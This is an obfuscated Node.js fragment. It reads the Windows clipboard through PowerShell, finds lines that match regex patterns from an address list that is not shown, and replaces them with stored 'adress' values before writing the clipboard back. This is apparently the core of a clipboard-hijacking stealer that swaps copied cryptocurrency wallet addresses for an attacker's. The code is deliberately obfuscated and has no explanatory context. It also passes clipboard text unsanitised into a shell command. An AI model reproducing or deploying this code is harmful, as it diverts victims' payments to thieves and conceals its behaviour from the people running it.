const _0x34de9a = require('child_process')

const _0x147d91 = _0x34de9a
    .execSync('powershell Get-Clipboard')
    .toString('utf8')
    .replace('\r', '')
let _0x15e155 = _0x147d91,
    _0x527dc5 = false
for (let _0x2e4419 = 0; _0x2e4419 < _0x4cbdda.length; _0x2e4419++) {
    const _0x38b90f = _0x4cbdda[_0x2e4419]
    for (let _0x279426 of _0x15e155.split('\n')) {
        if (_0x279426 == _0x38b90f.adress) {
            break
        }
        _0x38b90f.regex.test(_0x279426.replace('\r', '')) &&
        ((_0x527dc5 = true),
            (_0x15e155 = _0x15e155.replace(_0x279426, _0x38b90f.adress)))
    }
    _0x34de9a.execSync('powershell Set-Clipboard ' + _0x15e155)
}